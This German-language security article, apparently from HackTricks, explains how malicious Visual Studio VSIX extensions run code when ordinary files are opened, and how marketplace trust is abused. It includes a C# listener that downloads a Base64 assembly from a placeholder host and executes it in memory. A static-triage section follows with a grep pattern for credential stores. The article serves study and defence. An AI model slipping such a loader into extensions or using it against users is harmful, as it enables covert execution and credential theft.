# Missbrauch von Visual Studio-VSIX-Erweiterungen

{{#include ../banners/hacktricks-training.md}}

Eine Visual Studio-Erweiterung kann routinemäßige Aktivitäten im Editor in Codeausführung unter der Identität des angemeldeten Benutzers verwandeln. Eine schädliche VSIX, ein nachgeahmter Herausgeber oder ein kompromittiertes Erweiterungsupdate kann diesen Benutzer über normale Installationskanäle erreichen. Eine Installation mit Administratorabfrage ist ein Installationspfad mit Zustimmung und keine automatische Rechteausweitung.<sup>[[1]](#references)</sup>

## Ausführungsmodell

Klassische VSSDK-Erweiterungen werden häufig innerhalb von `devenv.exe` ausgeführt. Das neuere Modell `VisualStudio.Extensibility` führt moderne .NET-Erweiterungen größtenteils außerhalb des Prozesses aus: Visual Studio vermittelt Aufrufe an einen dedizierten Prozess `Microsoft.ServiceHub.Host.Extensibility`. Das isoliert die Stabilität der IDE, **sandboxt** die Erweiterung jedoch nicht von den Windows-Berechtigungen des Benutzers. Der genaue Name der ausführbaren Datei kann einen Architekturzusatz enthalten, etwa `ServiceHub.Host.Extensibility.arm64.exe`.<sup>[[1]](#references)[[2]](#references)</sup>

### Auslösen durch gewöhnliche Editoraktivitäten

Anstatt nur einen auffälligen Menübefehl bereitzustellen, kann eine Erweiterung `ITextViewOpenClosedListener` implementieren. Der Callback `TextViewOpenedAsync` wird für passende Dokumente aufgerufen, während `TextViewExtensionConfiguration.AppliesTo` die Aktivierung auf einen gängigen Typ wie JSON beschränken kann. Ein echter Formatter oder Linter kann weiterhin die angekündigte Aufgabe ausführen, während eine zweite Aktion als Nebeneffekt beim Öffnen einer Datei abläuft.<sup>[[1]](#references)[[3]](#references)</sup>

Das folgende reduzierte Muster zeigt die wichtigen Ausführungspunkte; der legitime Formatter und die Fehlerbehandlung wurden der Übersichtlichkeit halber weggelassen.<sup>[[1]](#references)[[3]](#references)</sup>

<details>
<summary>Durch Ereignisse ausgelöster In-Memory-Loader für verwaltete Assemblys</summary>

```csharp
[VisualStudioContribution]
internal class JsonListener : ExtensionPart, ITextViewOpenClosedListener
{
    public TextViewExtensionConfiguration TextViewExtensionConfiguration => new()
    {
        AppliesTo = [DocumentFilter.FromDocumentType("json")]
    };

    public async Task TextViewOpenedAsync(ITextViewSnapshot view, CancellationToken ct)
    {
        using var http = new HttpClient();
        var encoded = (await http.GetStringAsync("https://example.invalid/update.txt", ct)).Trim();
        using var stream = new MemoryStream(Convert.FromBase64String(encoded));
        var context = new AssemblyLoadContext(Guid.NewGuid().ToString(), isCollectible: true);
        var entry = context.LoadFromStream(stream).EntryPoint
            ?? throw new InvalidOperationException("Assembly has no entry point");
        var argv = entry.GetParameters().Length == 0 ? null : new object?[] { Array.Empty<string>() };
        if (entry.Invoke(null, argv) is Task task) await task;
        context.Unload();
    }

    public Task TextViewClosedAsync(ITextViewSnapshot view, CancellationToken ct)
        => Task.CompletedTask;
}
```

</details>

Diese Chain lädt Base64-Text herunter, dekodiert ihn in Assembly-Bytes, lädt ihn über einen `MemoryStream` in einen entladbaren `AssemblyLoadContext`, ruft den reflektierten `EntryPoint` mit entweder keinen Parametern oder einem `string[]` auf, wartet asynchrone Einstiegspunkte ab und entlädt den Kontext. Die zweite Stufe wird nicht auf die Festplatte geschrieben, obwohl das VSIX und die primäre Erweiterungs-DLL auf der Festplatte verbleibende Artefakte sind. Base64 bietet weder Authentizität noch Vertraulichkeit; die Verwendung von HTTP ermöglicht außerdem einem Angreifer auf dem Übertragungsweg, die Antwort zu ersetzen.<sup>[[1]](#references)</sup>

Zu den operativen Varianten gehört, alle Ausnahmen zu unterdrücken, damit die beworbene Funktion weiterläuft, wenn das Staging fehlschlägt, oder `ITextViewChangedListener` zu verwenden, um die Ausführung nach Änderungen auszulösen. Der Code wird im Erweiterungshost ausgeführt und kann auf verwaltete APIs, P/Invoke, Dateien, Zugangsdaten und untergeordnete Prozesse zugreifen, die diesem Benutzer zur Verfügung stehen.<sup>[[1]](#references)</sup>

Eine verwandte editorspezifische Ausführungsfläche, die auf dem automatischen Laden nativer Plugins basiert, findest du hier:

{{#ref}}
windows-local-privilege-escalation/notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Missbrauch des Vertrauens in Marketplace und Bereitstellung

Ein VSIX kann als direkt weitergegebene oder per Phishing verbreitete Datei, über den Web-Marketplace oder über den integrierten Marketplace-Browser von Visual Studio bezogen werden. Eine Herausgeberregistrierung, die hauptsächlich Eindeutigkeit und eine Liste reservierter Wörter sicherstellt, kann optisch irreführende Herausgeberidentitäten zulassen. Noch effektiver ist es, einen bereits vertrauenswürdigen Herausgeber oder eine Erweiterung zu kompromittieren, da diese eine installierte Nutzerbasis mitbringt. Bei der Marketplace-Installation wird Visual Studio Installer aufgerufen und das heruntergeladene VSIX vorübergehend unter `%LOCALAPPDATA%\Temp` abgelegt. `payload.vsix` wird auch legitim verwendet und ist daher allein anhand des Dateinamens kein Indikator.<sup>[[1]](#references)</sup>

MDSec konnte kein Visual-Studio-URL-Protokoll identifizieren, das eine Erweiterung direkt installiert. Ein Angreifer muss weiterhin erreichen, dass der Benutzer das VSIX installiert und ihm vertraut, oder den Verteilungsweg einer bestehenden Erweiterung kompromittieren. Ein `AllUsers`-Paket wird im Visual-Studio-Installationsordner installiert und kann eine Erhöhung der Berechtigungen anfordern. Dies ist jedoch normales, vom Benutzer bestätigtes Installationsverhalten und kein automatischer Weg zu Administrator- oder SYSTEM-Rechten.<sup>[[1]](#references)[[4]](#references)</sup>

### Statische Prüfung in großem Maßstab

VSIX-Pakete sind meist ZIP-Container. Eine sichere Pipeline zur Prüfung von Marketplace-Erweiterungen kann daher Pakete auflisten, sie **ohne Laden des Erweiterungscodes** entpacken, die Manifeste analysieren, ausführbare Oberflächen identifizieren und verwaltete Assemblies mit `ilspycmd` dekompilieren. Priorisiere die zur Erweiterung gehörenden Assemblies, nachdem gängige gebündelte Abhängigkeiten ausgeschlossen wurden. Korrelieren anschließend Zeichenfolgen zu Zugangsdaten-Speichern mit Verhaltensmustern wie Datei lesen plus Netzwerkübertragung, kodieren plus übertragen, herunterladen plus ausführen, Credential Manager plus Netzwerkzugriff oder Screenshot plus übertragen.<sup>[[1]](#references)[[5]](#references)</sup>

```bash
unzip -q sample.vsix -d sample-vsix
find sample-vsix -type f \( -iname '*.dll' -o -iname '*.exe' \) -print
ilspycmd -p -o decompiled sample-vsix/path/to/extension.dll
rg -n -i 'Login Data|logins\.json|key4\.db|wallet\.dat|\.aws[/\\]credentials|LoadFromStream|EntryPoint|cmd\.exe' decompiled
```

Inventarisiere auch native DLLs, MSBuild-Targets, Skripte, T4-Vorlagen und Installer-Payloads, statt davon auszugehen, dass jede Ausführungsfläche aus Managed Code besteht. Vergleiche verdächtiges Verhalten mit dem im Manifest angegebenen Zweck; Telemetrie und legitime Updater können Exfiltration oder Staging ähneln. Eine rein statische Überprüfung übersieht gepackten, verschleierten, dynamisch aufgelösten und ruhenden Code. Wer nur die neueste Version überprüft, übersieht außerdem möglicherweise schädliche frühere Releases.<sup>[[1]](#references)</sup>

## References

- [1] [MDSec - Visual-Studio-Erweiterungen erneut betrachtet](https://www.mdsec.co.uk/2026/05/visual-studio-extensions-revisited/)
- [2] [Microsoft Learn - Über VisualStudio.Extensibility](https://learn.microsoft.com/en-us/visualstudio/extensibility/visualstudio.extensibility/visualstudio-extensibility?view=visualstudio)
- [3] [Microsoft Learn - ITextViewOpenClosedListener.TextViewOpenedAsync](https://learn.microsoft.com/en-us/dotnet/api/microsoft.visualstudio.extensibility.editor.itextviewopenclosedlistener.textviewopenedasync?view=vs-extensibility)
- [4] [Microsoft Learn - Aufbau eines VSIX-Pakets](https://learn.microsoft.com/en-us/visualstudio/extensibility/anatomy-of-a-vsix-package?view=visualstudio)
- [5] [ILSpy - .NET-Tool ilspycmd](https://github.com/icsharpcode/ILSpy/blob/master/ICSharpCode.ILSpyCmd/README.md)
{{#include ../banners/hacktricks-training.md}}
